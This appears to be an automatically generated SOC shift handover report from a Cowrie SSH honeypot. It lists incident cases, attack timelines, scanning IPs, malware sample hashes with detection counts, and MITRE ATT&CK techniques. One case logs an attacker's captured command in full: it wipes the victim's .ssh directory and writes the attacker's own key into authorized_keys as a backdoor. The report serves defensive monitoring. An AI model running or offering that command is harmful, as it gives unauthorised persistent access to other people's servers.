| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:38:32` | `cowrie.session.connect` |
| `2026-06-07 11:38:32` | `cowrie.client.version` |
| `2026-06-07 11:38:32` | `cowrie.client.kex` |
| `2026-06-07 11:38:34` | `cowrie.login.success` |
| `2026-06-07 11:38:34` | `cowrie.session.params` |
| `2026-06-07 11:38:34` | `cowrie.command.input` |
| `2026-06-07 11:38:34` | `cowrie.command.failed` |
| `2026-06-07 11:38:35` | `cowrie.log.closed` |
| `2026-06-07 11:38:35` | `cowrie.session.params` |
| `2026-06-07 11:38:35` | `cowrie.command.input` |
| `2026-06-07 11:38:35` | `cowrie.session.file_download` |
| `2026-06-07 11:38:35` | `cowrie.log.closed` |
| `2026-06-07 11:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3baac90fd77

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 11:38 |
| **Last Seen** | 2026-06-07 11:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:38:39` | `cowrie.session.connect` |
| `2026-06-07 11:38:39` | `cowrie.client.version` |
| `2026-06-07 11:38:40` | `cowrie.client.kex` |
| `2026-06-07 11:38:41` | `cowrie.login.success` |
| `2026-06-07 11:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-333fd7a2f6ab

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 11:42 |
| **Last Seen** | 2026-06-07 11:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:42:57` | `cowrie.session.connect` |
| `2026-06-07 11:42:57` | `cowrie.client.version` |
| `2026-06-07 11:42:58` | `cowrie.client.kex` |
| `2026-06-07 11:43:00` | `cowrie.login.success` |
| `2026-06-07 11:43:00` | `cowrie.session.params` |
| `2026-06-07 11:43:00` | `cowrie.command.input` |
| `2026-06-07 11:43:00` | `cowrie.command.failed` |
| `2026-06-07 11:43:01` | `cowrie.log.closed` |
| `2026-06-07 11:43:01` | `cowrie.session.params` |
| `2026-06-07 11:43:01` | `cowrie.command.input` |
| `2026-06-07 11:43:02` | `cowrie.session.file_download` |
| `2026-06-07 11:43:02` | `cowrie.log.closed` |
| `2026-06-07 11:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05e89ed98e9

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 11:43 |
| **Last Seen** | 2026-06-07 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:43:04` | `cowrie.session.connect` |
| `2026-06-07 11:43:04` | `cowrie.client.version` |
| `2026-06-07 11:43:04` | `cowrie.client.kex` |
| `2026-06-07 11:43:06` | `cowrie.login.success` |
| `2026-06-07 11:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.198.80[.]171` | **95** | 2026-06-07 09:18 | 2026-06-07 11:49 | 85m | 0 | `T1592` | 🟠 MEDIUM |
| `177.23.233[.]83` | **65** | 2026-06-07 09:51 | 2026-06-07 11:01 | 130m | 0 | `T1592` | 🟠 MEDIUM |
| `20.81.140[.]174` | **22** | 2026-06-07 09:18 | 2026-06-07 11:50 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.114[.]231` | **17** | 2026-06-07 11:29 | 2026-06-07 11:49 | 18m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.190.51[.]254` | **13** | 2026-06-07 09:48 | 2026-06-07 11:06 | 1m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.158.14[.]124` | **7** | 2026-06-07 11:25 | 2026-06-07 11:49 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `187.33.59[.]116` | **6** | 2026-06-07 09:20 | 2026-06-07 10:33 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]42` | **3** | 2026-06-07 11:41 | 2026-06-07 11:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.26.136[.]75` | **2** | 2026-06-07 11:43 | 2026-06-07 11:43 | 1m | 0 | `T1592` | 🟢 LOW |
| `18.191.166[.]199` | **2** | 2026-06-07 09:28 | 2026-06-07 09:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]62` | **2** | 2026-06-07 09:31 | 2026-06-07 09:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.81[.]144` | 1 | 2026-06-07 09:21 | 2026-06-07 09:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.31.103[.]129` | 1 | 2026-06-07 09:34 | 2026-06-07 09:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.153.81[.]58` | 1 | 2026-06-07 11:47 | 2026-06-07 11:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `157.0.0[.]10` | 1 | 2026-06-07 09:29 | 2026-06-07 09:29 | 30s | 0 | `T1592` | 🟢 LOW |
| `165.154.1[.]18` | 1 | 2026-06-07 11:36 | 2026-06-07 11:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.231[.]236` | 1 | 2026-06-07 09:35 | 2026-06-07 09:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.161.68[.]242` | 1 | 2026-06-07 11:50 | 2026-06-07 11:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.179.31[.]237` | 1 | 2026-06-07 11:48 | 2026-06-07 11:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (33 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `143.198.80[.]171` | SG | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `20.161.68[.]242` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `18.191.166[.]199` | US | Amazon Technologies Inc. | **100** ⚠️ | 2 |
| `47.121.184[.]138` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 1 |
| `14.103.114[.]231` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `172.190.51[.]254` | US | Microsoft Limited | **100** ⚠️ | 27 |
| `177.23.233[.]83` | BR | EMA Comércio de Eletrônicos e Servicos Ltda. | **100** ⚠️ | 2 |
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `157.0.0[.]10` | CN | China Unicom Jiangsu province network | **100** ⚠️ | 50 |
| `187.33.59[.]116` | BR | R & F BASSAN COMÉRCIO SERVIÇOS E SISTEMA LTDA - ME | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 85 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 41 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |

---

## 🔕 False Positive Summary (37 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 10 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 307 cases |
| Tool 34  | Credential Extractor        | ✅ 70 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 37 filtered (12.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 33 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 19 recon entry/entries in table (11 group(s) consolidating 234 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-07T11:51:36Z_
